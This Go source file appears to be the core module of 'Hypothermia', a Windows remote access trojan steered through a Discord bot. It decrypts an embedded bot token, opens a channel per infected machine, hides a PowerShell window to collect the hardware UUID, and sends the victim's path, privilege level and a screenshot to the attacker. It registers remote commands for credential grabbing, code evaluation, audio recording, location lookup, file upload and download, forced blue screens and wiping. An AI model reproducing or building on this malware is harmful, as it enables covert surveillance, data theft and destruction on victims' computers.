package core

import (
	"bytes"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"Hypothermia/config"
	"Hypothermia/src/core/commands"
	"Hypothermia/src/funcs"
	"Hypothermia/src/utils"
	"Hypothermia/src/utils/crypto"

	"github.com/bwmarrin/discordgo"
)

type Command interface {
	Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string)
	Name() string
	Info() string
}

var commandsList = make(map[string]Command)
var channelId string

var serverId string = utils_crypto.Decrypt(config.ServerId)

func Init() {
	register()

	var fakeStuff = map[string]string{
		"BOT_TOKEN":   "Bot" + config.FakeToken,
		"CATEGORY_ID": "Category" + config.FakeCategory,
		"SERVER_ID":   "Server" + config.FakeServer,
	}

	if rand.Intn(1032) == 193 {
		fmt.Println(fakeStuff)
	}

	dg, err := discordgo.New("Bot " + utils_crypto.Decrypt(config.BotToken))
	if err != nil {
		fmt.Println("manager/3 -", err)
		fmt.Scanln()
		return
	}

	dg.AddHandler(handler)

	err = dg.Open()
	if err != nil {
		fmt.Println("manager/4 -", err)
		return
	}

	categoryId := utils_crypto.Decrypt(config.CategoryId)
	identifier := utils.GetIdentifier()

	if categoryId == "" {
		categoryId = getCategory(dg)
	}

	channel, code := getChannel(dg, categoryId, identifier)
	channelId = channel

	path, err := os.Executable()
	if err != nil {
		path = "?"
	} else {
		path, err = filepath.Abs(path)
		if err != nil {
			path = "?"
		}
	}

	var admin string
	isAdmin, err := utils.IsAdmin()
	if err != nil {
		admin = "Could not get"
	} else {
		if isAdmin {
			admin = "Admin"
		} else {
			admin = "User"
		}
	}

	var msg string
	if code == 1 {
		msg = "Hypotermia successfully connected to new machine."
	} else if code == 2 {
		msg = "Hypotermia successfully reconnected."
	}

	hwid := getHWID()
	dg.ChannelMessageSend(
		channel,
		fmt.Sprintf(
			"@here "+
				"%s [%d.%d.%d%s]\n\n"+
				"UUID: %s\n"+
				"Running in: %s\n"+
				"Running as: %s\n",
			msg, config.Major, config.Minor,
			config.Patch, config.Variant,
			hwid, path, admin,
		),
	)

	buf, code := funcs.Screenshot()
	if code == 0 {
		dg.ChannelMessageSendComplex(channel, &discordgo.MessageSend{
			Files: []*discordgo.File{{
				Name:   "ss.jpg",
				Reader: buf,
			}},
		})
	}

	select {}
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	defer func() {
		err := recover()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("⚠️ FATAL ERROR: %v", err), m.Reference())
		}
	}()

	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.ChannelID != channelId {
		return
	}

	if !strings.HasPrefix(m.Content, config.Prefix) {
		return
	}

	args := strings.Fields(m.Content[len(config.Prefix):])
	if len(args) == 0 {
		return
	}

	cmdName := strings.ToLower(args[0])
	if cmdName == "help" {
		var helpStr string = "commands:\n"

		for _, cmd := range commandsList {
			helpStr += cmd.Name() + " - " + cmd.Info() + "\n"
		}

		helpStr += fmt.Sprintf("\nprefix: `%s`", config.Prefix)

		s.ChannelMessageSendReply(m.ChannelID, helpStr, m.Reference())
		return
	}

	cmd, exists := commandsList[cmdName]
	if exists {
		cmd.Run(s, m, args[1:])
	} else {
		s.ChannelMessageSendReply(m.ChannelID, "This command does not exist, do `>help` for help.", m.Reference())
	}
}

func register() {
	commandsList["audio"] = &commands.AudioCommand{}
	commandsList["bomb"] = &commands.BombCommand{}
	commandsList["brightness"] = &commands.LightCommand{}
	commandsList["bsod"] = &commands.BSODCommand{}
	commandsList["critical"] = &commands.Criticalommand{}
	commandsList["download"] = &commands.DownloadCommand{}
	commandsList["env"] = &commands.EnvCommand{}
	commandsList["eval"] = &commands.EvalCommand{}
	commandsList["grab"] = &commands.GrabCommand{}
	commandsList["input"] = &commands.InputCommand{}
	commandsList["listen"] = &commands.ListenCommand{}
	commandsList["locate"] = &commands.LocateCommand{}
	commandsList["notif"] = &commands.NotifCommand{}
	commandsList["overwrite"] = &commands.OverwriteCommand{}
	commandsList["ping"] = &commands.PingCommand{}
	commandsList["record"] = &commands.RecordCommand{}
	commandsList["setting"] = &commands.SettingCommand{}
	commandsList["simulate"] = &commands.SimulateCommand{}
	commandsList["ss"] = &commands.ScreenShotCommand{}
	commandsList["tree"] = &commands.TreeCommand{}
	commandsList["tts"] = &commands.TTSCommand{}
	commandsList["upload"] = &commands.UploadCommand{}
	commandsList["volume"] = &commands.VolumeCommand{}
	commandsList["wallpaper"] = &commands.WallpaperCommand{}
	commandsList["webblock"] = &commands.WebBlockCommand{}
	commandsList["wipe"] = &commands.WipeCommand{}
}

func getCategory(s *discordgo.Session) string {
	channels, _ := s.GuildChannels(serverId)

	for _, channel := range channels {
		if channel.Type == discordgo.ChannelTypeGuildCategory && channel.Name == "Bot" {
			return channel.ID
		}
	}

	category, _ := s.GuildChannelCreateComplex(serverId, discordgo.GuildChannelCreateData{
		Name: "Bot",
		Type: discordgo.ChannelTypeGuildCategory,
	})

	return category.ID
}

func getChannel(s *discordgo.Session, categoryId string, name string) (id string, code int) {
	channels, err := s.GuildChannels(serverId)
	if err != nil {
		return "", 0
	}

	name = strings.ToLower(strings.TrimSpace(name))
	for _, channel := range channels {
		channelName := strings.ToLower(strings.TrimSpace(channel.Name))

		if channelName == name && channel.Type == discordgo.ChannelTypeGuildText && channel.ParentID == categoryId {
			return channel.ID, 2
		}
	}

	channel, err := s.GuildChannelCreateComplex(serverId, discordgo.GuildChannelCreateData{
		Name:     name,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryId,
	})

	if err != nil {
		return "", 0
	}

	return channel.ID, 1
}

func getHWID() string {
	cmd := exec.Command("powershell", "-Command", "(Get-CimInstance Win32_ComputerSystemProduct).UUID")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	var out bytes.Buffer
	cmd.Stdout = &out

	err := cmd.Run()
	if err != nil {
		return "UNK_GUID_NF"
	}

	return strings.TrimSpace(out.String())
}
